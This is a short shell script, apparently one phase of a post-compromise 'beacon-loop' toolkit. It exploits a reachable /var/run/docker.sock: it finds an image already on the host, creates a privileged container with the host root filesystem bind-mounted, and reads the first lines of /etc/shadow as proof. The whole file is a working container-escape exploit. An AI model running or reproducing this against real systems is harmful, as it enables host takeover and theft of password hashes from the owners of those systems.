#!/bin/sh
# docker.sock escape: privileged container with host root bind mount.
# Serves the beacon-loop docker_escape phase: when the compromised
# container can reach /var/run/docker.sock, this creates a privileged
# helper container with the host rootfs mounted at /host, has it copy
# /etc/shadow into the shared /tmp, and prints the proof.
set -u

SOCK=/var/run/docker.sock
API=http://localhost/v1.41

if [ ! -S "$SOCK" ]; then
    echo "[-] no docker socket at $SOCK"
    exit 1
fi

IMG=""
for CANDIDATE in alpine busybox debian python php nginx; do
    if curl -sf --unix-socket "$SOCK" "$API/images/$CANDIDATE/json" >/dev/null 2>&1; then
        IMG="$CANDIDATE"
        break
    fi
done
if [ -z "$IMG" ]; then
    echo "[-] no reusable image found on the host"
    exit 1
fi

curl -s --unix-socket "$SOCK" -X DELETE "$API/containers/lzesc?force=1&v=1" >/dev/null 2>&1
curl -s --unix-socket "$SOCK" -X POST \
    -H "Content-Type: application/json" \
    -d '{"Image":"'"$IMG"'","Cmd":["sh","-c","id; head -n 3 /host/etc/shadow"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
    "$API/containers/create?name=lzesc" >/dev/null 2>&1
curl -s --unix-socket "$SOCK" -X POST "$API/containers/lzesc/start" >/dev/null 2>&1
sleep 3

echo "--- docker escape proof (helper container output) ---"
curl -s --unix-socket "$SOCK" "$API/containers/lzesc/logs?stdout=1&stderr=1&tail=10" 2>/dev/null | tr -d '\000-\010\013-\037' | tail -n 6
